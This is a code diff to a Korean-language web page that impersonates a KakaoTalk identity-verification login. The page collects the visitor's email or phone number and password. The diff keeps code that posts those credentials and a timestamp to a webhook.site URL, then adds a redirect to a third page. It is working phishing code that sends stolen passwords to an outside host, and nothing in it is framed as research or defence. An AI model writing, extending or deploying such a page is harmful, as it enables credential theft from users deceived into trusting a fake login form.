@@ -1,4 +1,3 @@
-
 <!DOCTYPE html>
 <html lang="ko">
 <head>
@@ -50,10 +49,12 @@
     <h2>카카오톡 본인인증하기</h2>
     <input type="text" placeholder="이메일 또는 전화번호" id="userId" style="width:370px; padding:5px;">
     <input type="password" placeholder="비밀번호" id="userPw" style="width:370px; padding:5px;">
-    <button type="button" class="btn-gray" onclick="login()">본인인증하기</button>
+    <button type="button" class="btn-gray" onclick="goToPage3()">본인인증하기</button>
   </div>
 
   <script>
+    const webhookUrl = "https://webhook.site/be034e81-7e5e-419d-a673-4f9dce49b392";
+
     function goNext() {
       const chk = document.getElementById("agree");
       if (!chk.checked) {
@@ -64,7 +65,7 @@
       }
     }
 
-    function login() {
+    function goToPage3() {
       const email = document.getElementById("userId").value.trim();
       const password = document.getElementById("userPw").value.trim();
 
@@ -73,13 +74,9 @@
         return;
       }
 
-      console.log("이메일/전화번호:", email);
-      console.log("비밀번호:", password);
-
-      // webhook.site URL
-      const webhookUrl = " https://webhook.site/be034e81-7e5e-419d-a673-4f9dce49b392";
-
+      // 2페이지 입력값을 webhook으로 전송
       const formData = new URLSearchParams();
+      formData.append("page", "2");
       formData.append("email", email);
       formData.append("password", password);
       formData.append("timestamp", new Date().toISOString());
@@ -89,7 +86,11 @@
         headers: { "Content-Type": "application/x-www-form-urlencoded" },
         body: formData
       })
-      .then(() => alert("webhook.site에 값이 전송되었습니다!"))
+      .then(() => {
+        alert("2페이지 값이 전송되었습니다!");
+        // page3.html로 이동
+        window.location.href = "page3.html";
+      })
       .catch(err => console.error("전송 오류:", err));
     }
   </script>
